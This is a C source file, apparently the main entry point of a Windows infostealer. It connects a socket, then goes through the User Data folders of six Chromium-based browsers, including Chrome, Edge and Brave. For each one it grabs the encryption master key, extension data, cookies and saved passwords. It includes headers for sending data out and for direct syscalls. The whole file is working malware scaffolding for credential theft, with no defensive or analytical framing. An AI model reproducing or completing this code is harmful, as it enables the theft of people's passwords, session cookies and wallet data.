#include "../include/ExtensionsGrabber.h"
#include "../include/BrowserGrabber.h"
#include "../include/DirectoryOps.h"
#include "../include/StringUtils.h"
#include "../include/MasterKeyGrabber.h"
#include "../include/syscalls.h"
#include "../include/PathOps.h"
#include "../include/SendData.h"

#include <windows.h>
#include <stdio.h>

#define BROWSERS 6

extern unsigned long long hSocket;

int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd) {
    HANDLE              FolderHandle      = {0};
    unsigned short      FolderPath[256]   = {0};

    InitSocket();
    if (hSocket == -1) {
        printf("no internet\n");
        return 1;
    }

    unsigned short *paths[] = {
        L"\\Amigo\\User Data",
        L"\\Sputnik\\Sputnik\\User Data",
        L"\\Google\\Chrome\\User Data",
        L"\\Microsoft\\Edge\\User Data",
        L"\\Kometa\\User Data",
		L"\\BraveSoftware\\Brave-Browser\\User Data"
    };

    int i = 0;
    while (i < BROWSERS) {
        InitPath(paths[i], FolderPath);
        if (OpenFolder(&FolderHandle, FolderPath) == 0) {
            GrabMasterKey(FolderPath);
            ExtensionsGrabber(FolderPath);
            GrabCookies(FolderPath, lenW(FolderPath));
            GrabPassword(FolderPath, lenW(FolderPath));
        }
        i++;
    }

    return 0;
}